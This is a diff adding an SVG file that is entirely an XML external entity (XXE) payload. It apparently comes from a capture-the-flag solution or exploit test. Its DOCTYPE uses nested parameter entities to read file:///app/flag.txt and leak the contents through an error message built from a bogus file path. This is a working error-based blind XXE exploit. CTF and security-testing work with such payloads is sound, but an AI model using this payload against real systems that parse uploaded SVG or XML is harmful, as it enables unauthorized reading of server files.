@@ -1,0 +1,14 @@
+<?xml version="1.1" standalone="no" ?>
+<!DOCTYPE svg  [
+    <!ENTITY % NUMBER '
+        <!ENTITY &#x25; file SYSTEM "file:///app/flag.txt">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+    '>
+
+    %NUMBER;
+]>
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
+&a;
+</svg>
